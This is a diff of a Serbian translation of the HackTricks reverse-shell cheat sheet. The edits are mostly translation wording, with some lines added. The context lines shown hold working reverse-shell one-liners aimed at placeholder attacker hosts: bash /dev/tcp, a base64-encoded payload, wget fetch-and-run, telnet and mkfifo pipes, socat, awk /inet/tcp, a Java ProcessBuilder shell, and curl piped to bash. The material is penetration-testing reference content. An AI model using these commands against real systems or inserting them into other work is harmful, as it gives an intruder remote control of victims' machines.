@@ -8,7 +8,7 @@ Drugi načini podrške HackTricks-u:
 
 * Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
@@ -16,7 +16,7 @@ Drugi načini podrške HackTricks-u:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -41,7 +41,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Bezbedan shell sa simbolima
+### Bezbedan simbolni shell
+
+Ne zaboravite da proverite i druge shelove: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -53,19 +55,19 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Objasnjenje Shell-a
 
 1. **`bash -i`**: Ovaj deo komande pokreće interaktivnu (`-i`) Bash ljusku.
-2. **`>&`**: Ovaj deo komande je skraćena oznaka za **preusmeravanje kako standardnog izlaza** (`stdout`) **tako i standardne greške** (`stderr`) **na istu destinaciju**.
+2. **`>&`**: Ovaj deo komande je skraćena oznaka za **preusmeravanje kako standardnog izlaza** (`stdout`) tako i **standardne greške** (`stderr`) na **isti odredište**.
 3. **`/dev/tcp/<NAPADAC-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP konekciju ka navedenoj IP adresi i portu**.
 * **Preusmeravanjem izlaznih i grešnih tokova u ovaj fajl**, komanda efikasno šalje izlaz interaktivne ljuske sesije ka računaru napadača.
-4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na istu destinaciju kao standardni izlaz (`stdout`)**.
+4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na isto odredište kao standardni izlaz (`stdout`)**.
 
-### Kreiraj u fajlu i izvrši
+### Kreirajte fajl i izvršite
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Napredna ljuska
 
-Kada se bavite ranjivošću **Remote Code Execution (RCE)** unutar veb aplikacije zasnovane na Linuxu, postizanje reverzne ljuske može biti otežano mrežnim odbranama poput iptables pravila ili složenih mehanizama filtriranja paketa. U takvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) ljuske kako biste efikasnije interagirali sa kompromitovanim sistemom.
+Kada se suočite sa ranjivošću **Remote Code Execution (RCE)** unutar veb aplikacije zasnovane na Linuxu, postizanje reverzne ljuske može biti otežano zbog mrežnih odbrana poput iptables pravila ili složenih mehanizama filtriranja paketa. U takvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) ljuske kako biste efikasnije interagirali sa kompromitovanim sistemom.
 
 Preporučeni alat za tu svrhu je [toboggan](https://github.com/n3rada/toboggan.git), koji pojednostavljuje interakciju sa ciljnim okruženjem.
 
@@ -107,7 +109,7 @@ Samo trebate izmeniti:
 - Prefiks i sufiks vašeg payload-a (ako postoji)
 - Način slanja payload-a (zaglavlja? podaci? dodatne informacije?)
 
-Zatim možete jednostavno **slati komande** ili čak **koristiti komandu `upgrade`** da biste dobili potpuni PTY (imajte na umu da se cevi čitaju i pišu sa oko 1.3s kašnjenja).
+Zatim možete jednostavno **slati komande** ili čak **koristiti komandu `upgrade`** da biste dobili potpunu PTY (imajte na umu da se cevi čitaju i pišu sa oko 1.3s kašnjenja).
 
 ## Netcat
 ```bash
@@ -125,7 +127,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet je jednostavan protokol za pristup udaljenom računaru ili uređaju preko mreže. On omogućava korisniku da se prijavi na udaljeni sistem i izvršava komande kao da je direktno povezan sa tim sistemom. Telnet nije siguran protokol jer podaci koji se prenose nisu šifrovani, pa se preporučuje korišćenje sigurnijih alternativa poput SSH-a.
+Telnet je jednostavan protokol za pristup udaljenom računaru preko mreže.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -138,7 +140,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Da biste poslali komandu, napišite je, pritisnite Enter, a zatim pritisnite CTRL+D (da zaustavite STDIN)
+Da biste poslali komandu, napišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)
 
 **Žrtva**
 ```bash
@@ -270,6 +272,8 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
+
+Awk je moćan alat za obradu teksta koji se često koristi u shell skriptama. Može se koristiti za pretraživanje i obradu teksta, kao i za izvlačenje i prikazivanje određenih informacija iz datoteka. Awk koristi redove i kolone kao osnovne jedinice podataka i omogućava korisnicima da lako manipulišu podacima na ovaj način.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -279,7 +283,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Da biste poslali komandu, napišite je, pritisnite Enter, a zatim pritisnite CTRL+D (da zaustavite STDIN)
+Da biste poslali komandu, napišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)
 
 **Žrtva**
 ```bash
@@ -341,7 +345,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -355,6 +359,6 @@ Drugi načini podrške HackTricks-u:
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
